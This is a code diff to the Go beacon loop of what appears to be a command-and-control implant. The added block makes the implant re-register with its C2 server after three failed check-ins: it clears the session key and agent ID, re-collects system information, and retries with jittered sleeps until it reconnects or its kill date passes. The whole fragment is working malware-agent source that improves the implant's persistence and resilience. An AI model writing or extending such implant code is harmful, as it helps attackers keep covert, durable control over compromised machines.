@@ -112,6 +112,26 @@ func Run(serverURL string, serverPub *rsa.PublicKey, sleepSec, jitterPct int, ki
 
 		if err != nil {
 			failCount++
+			// After 3 consecutive failures the server session key is likely gone
+			// (e.g. server restarted). Clear session state and re-register so we
+			// get a fresh session rather than looping forever with a dead key.
+			if failCount >= 3 {
+				imp.transport.sessionKey = nil
+				imp.transport.agentID = ""
+				imp.transport.agentName = ""
+				failCount = 0
+				sysinfo = CollectSysInfo()
+				for {
+					if CheckKillDate(imp.killDate) {
+						return
+					}
+					if rerr := imp.transport.Register(sysinfo); rerr == nil {
+						break
+					}
+					SleepWithJitter(imp.sleep, imp.jitter)
+				}
+				continue
+			}
 			// Exponential backoff on failures (avoid flooding dead C2)
 			backoff := ExponentialBackoff(failCount, imp.sleep)
 			SleepWithJitter(int(backoff.Seconds()), imp.jitter)
